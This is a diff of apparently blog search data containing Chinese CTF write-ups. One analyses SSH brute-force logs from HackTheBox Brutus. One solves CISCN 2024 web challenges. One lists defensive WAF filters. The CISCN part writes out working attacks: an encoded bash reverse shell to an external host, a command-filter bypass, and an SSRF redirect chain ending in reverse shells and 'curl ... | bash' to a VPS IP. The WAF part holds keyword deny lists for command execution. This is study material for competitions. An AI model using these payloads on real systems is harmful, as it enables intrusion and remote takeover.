-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
-<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
-<p>善于使用搜索引擎</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
-
-<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bumblebee-HackTheBox</title>
     <url>/article/Bumblebee-HackTheBox.html</url>
     <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
@@ -324,6 +340,217 @@
       </tags>
   </entry>
   <entry>
+    <title>Brutus-HackTheBox</title>
+    <url>/article/Brutus-HackTheBox.html</url>
+    <content><![CDATA[<p>wtmp日志文件</p>
+<span id="more"></span>
+
+
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
+<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
+<p>我们在对成功登录的日志记录下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
+
+<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
+<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
+<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
+<blockquote>
+<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
+</blockquote>
+<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
+<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
+<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
+<p>善于使用搜索引擎</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
+
+<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CISCN2024初赛</title>
+    <url>/article/CISCN2024%E5%88%9D%E8%B5%9B.html</url>
+    <content><![CDATA[<p>国赛爆0，特此记录下CISCN复现学习</p>
+<span id="more"></span>
+
+<h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]); </span><br><span class="line">     if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;, $cmd)) &#123;</span><br><span class="line">         system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>open_basedir</code>限制了只能在当前目录进行操作，对cmd参数进行转义处理</p>
+<p>其中escapeshellcmd函数可以在PHP中文手册查到</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523183210290.png" alt="image-20240523183210290"></p>
+<p>可用命令如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">tee</span></span><br><span class="line"><span class="built_in">base32</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">php</span><br><span class="line">mysql</span><br><span class="line"><span class="built_in">paste</span>	<span class="comment"># 这个可以直接读文件</span></span><br><span class="line">rev	<span class="comment"># 这个可以直接读文件</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>不过限制太死了，这里考虑PHP命令行参数注入</p>
+<p>（可以先<code>php -i</code>看看有无回显）</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523184748038.png" alt="image-20240523184748038"></p>
+<p>由于点号和星号被过滤了，所以使用-r参数</p>
+<p>本地测试发现在<code>php -r</code>情况下<code>()</code>并不会因为转义影响代码执行，并且并不需要<code>&#39;&#39;</code>包裹代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="keyword">print</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>确实能执行简单命令，但是过滤这么多就要考虑编码绕过（base64不行就用hex代替）</p>
+<p>执行id命令测试下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="number">6964</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523185423466.png" alt="image-20240523185423466"></p>
+<p>进一步测试时发现，如果命令过长hex加密后会出现英文字母导致报错</p>
+<p>这里需要借助substr函数的特性<code>强转字符串</code>，然后再截断多余字符</p>
+<p>那么我们弹个shell先</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/47829 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81aTc4MTk2M3AyLnlpY3AuZnVuLzQ3ODI5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hex编码一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r system(hex2bin(substr(_62617368202d63207b6563686f2c596d467a614341746153412b4a6941765a4756324c33526a63433831615463344d546b324d3341794c6e6c70593341755a6e56754c7a51334f4449354944412b4a6a453d7d7c7b6261736536342c2d647d7c7b626173682c2d697d,1)));</span><br></pre></td></tr></table></figure>
+
+<p>不过由于ctfshow平台的问题弹不成功</p>
+<p>并且在根目录下以及环境变量都没有flag，我们执行<code>paste /etc/passwd</code></p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523192807005.png" alt="image-20240523192807005"></p>
+<p>可以注意到存在mysql用户，那么猜测flag在数据库里</p>
+<p>使用默认用户和密码和<code>-e</code>参数去查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -proot -e &quot;show databases;&quot;</span><br><span class="line">mysql -u root -proot -e &quot;use PHP_CMS;show tables;&quot;</span><br><span class="line">mysql -u root -proot -e &quot;use PHP_CMS;select * from F1ag_Se3Re7;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523193507959.png" alt="image-20240523193507959"></p>
+<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>扫一下目录发现存在<code>/flag.php</code></p>
+<p>题目给了hint</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>限制了ip为127.0.0.1才能命令执行，很明显的ssrf</p>
+<p>从github上把源码下载下来后，全局搜索<code>curl_exec</code>，找到两个函数分别是<code>dr_catcher_data</code>和<code>dr_post_json_data</code>不过暂时不知道如何利用</p>
+<p>我们访问官方网站查看公布的漏洞列表，注意到qrcode存在ssrf漏洞 <a href="https://m.xunruicms.com/bug/">官网链接</a></p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523202014573.png" alt="image-20240523202014573"></p>
+<p>用Seay代审全局搜索找到qrcode函数，注意到有调用<code>dr_catcher_data</code>函数</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523202224434.png" alt="image-20240523202224434"></p>
+<p>我们肯定是利用curl来ssrf，现在有两个要解决的问题</p>
+<ol>
+<li>如何构造payload</li>
+<li>如何构造php文件使得以127.0.0.1去访问<code>/flag.php</code></li>
+</ol>
+<p><strong>构造payload</strong></p>
+<p>我们注意到调用<code>dr_catcher_data</code>函数的时候参数为<code>$thumb</code>，全局搜索一下还是在<code>Helper.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二维码调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_qrcode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$thumb</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$level</span> = <span class="string">&#x27;H&#x27;</span>, <span class="variable">$size</span> = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ROOT_URL.<span class="string">&#x27;index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$thumb</span>).<span class="string">&#x27;&amp;text=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$text</span>).<span class="string">&#x27;&amp;size=&#x27;</span>.<span class="variable">$size</span>.<span class="string">&#x27;&amp;level=&#x27;</span>.<span class="variable">$level</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在进行二维码调用的时候会出现<code>$thumb</code>，给他赋值去读取我们vps上的恶意文件，从而传递给<code>dr_catcher_data</code>函数</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://d068a101-a0c4-4e49-990f-06f5fea551f9.challenge.ctf.show/?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://45.136.15.177:1028/shell.php&amp;text=1&amp;size=1&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p>我们可以先测试下能否访问，这里vps是借吕哥的</p>
+<p>ssh连上后创建shell.php文件，然后本地开启php服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:1028</span><br></pre></td></tr></table></figure>
+
+<p>靶机执行payload，成功访问（执行的payload只能一次，再执行要修改size大小）</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523204851334.png" alt="image-20240523204851334"></p>
+<p>接下来要解决如何构造php文件</p>
+<p><strong>构造shell.php</strong></p>
+<p>目的是以ip为127.0.0.1去访问，所以我们可以利用location去重定向</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_url=&quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">header(&quot;Location: &quot;. $target_url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>编写好后，执行payload成功发生302跳转</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523205505740.png" alt="image-20240523205505740"></p>
+<p>我们可以反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_url=&quot;http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/45.136.15.177/777%200%3E&amp;1%22&quot;;</span><br><span class="line">header(&quot;Location: &quot;. $target_url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者在vps写个sh脚本来弹，然后用curl去访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_url=&quot;http://127.0.0.1/flag.php?cmd=curl%20http://45.136.15.177:1028/reverse.sh%20%7Cbash&quot;;</span><br><span class="line">header(&quot;Location: &quot;. $target_url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240523214508243.png" alt="image-20240523214508243"></p>
+<p>反弹成功后得到flag</p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>[CISCN 2024线下赛]备战AWDP</title>
+    <url>/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP.html</url>
+    <content><![CDATA[<p>备战6月22日的CISCN线下赛 AWDP</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次CISCN华东南赛区我们学校是承办方，当然晋级名额变成三队，不过由于本人实力有限加上最后黑灯的时候差一点做出来<code>easycms-revenge</code>，本来都打算退役了。在看到主办方发的晋级名单后，发现我们以倒一晋级线下赛，实在是续了下香火。既然都进了，总不能玩几小时pvz吧，所以打算从今天开始备战AWDP</p>
+<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。</p>
+<p>每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。</p>
+<p>简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分。</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>AWDP包括攻击和防守，比赛的时候要两边都顾，如果在攻击无果的情况下，可以往修复上看，因为防守成功也会得分。</p>
+<h1 id="防守WAF"><a href="#防守WAF" class="headerlink" title="防守WAF"></a>防守WAF</h1><p><a href="https://github.com/Drun1baby/JavaSecFilters/tree/main/PHP">参考文章</a></p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafrce($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|tail|flag|exec|base64|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafsqli($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafxss($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 允许上传的文件类型</span><br><span class="line">$allowedExtensions = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line"></span><br><span class="line">// 上传文件的目录</span><br><span class="line">$uploadDir = &quot;uploads/&quot;;</span><br><span class="line"></span><br><span class="line">// 检查文件是否上传成功</span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">    $file = $_FILES[&quot;file&quot;];</span><br><span class="line"></span><br><span class="line">    // 获取文件的扩展名</span><br><span class="line">    $extension = pathinfo($file[&quot;name&quot;], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    // 检查文件类型是否允许上传</span><br><span class="line">    if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">        echo &quot;只允许上传以下类型的文件: &quot; . implode(&quot;, &quot;, $allowedExtensions);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查上传文件是否为真实的图像文件</span><br><span class="line">    if (getimagesize($file[&quot;tmp_name&quot;]) === false) &#123;</span><br><span class="line">        echo &quot;上传文件不是有效的图像文件。&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成一个唯一的文件名以避免重复</span><br><span class="line">    $uniqueFileName = uniqid() . &quot;.&quot; . $extension;</span><br><span class="line"></span><br><span class="line">    // 移动上传的文件到目标目录</span><br><span class="line">    if (move_uploaded_file($file[&quot;tmp_name&quot;], $uploadDir . $uniqueFileName)) &#123;</span><br><span class="line">        echo &quot;文件上传成功！&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件上传失败。&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xmlData = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">$xml = simplexml_load_string($xmlData);</span><br><span class="line">echo $xml-&gt;name;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="自定义过滤关键词"><a href="#自定义过滤关键词" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">strings = &quot;ana&quot;  # 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for i in filter_list:</span><br><span class="line">    if i in strings:</span><br><span class="line">        print(&quot;Hacker!&quot; )</span><br></pre></td></tr></table></figure>
+
+<h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><p>自定义过滤关键词</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const keywords = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;];</span><br><span class="line"></span><br><span class="line">for (const i of keywords) &#123;</span><br><span class="line">    if (code.includes(i)) &#123;</span><br><span class="line">        console.log(&quot;Hacker!&quot;) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="自定义过滤关键词-1"><a href="#自定义过滤关键词-1" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] filterList = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;;</span><br><span class="line">String str = &quot;ana&quot;; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line"></span><br><span class="line">for (String s : filterList) &#123;</span><br><span class="line">    if (s.contains(str)) &#123;</span><br><span class="line">        System.out.println(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> 去到对应的接口下面修改即可</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> @ ban 了几个协议，如果单纯全部阻挡什么 127.0.0.1，业务不一定过得去。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class sqlFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;file|http|jar|gopher|tar|war&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含SQL关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
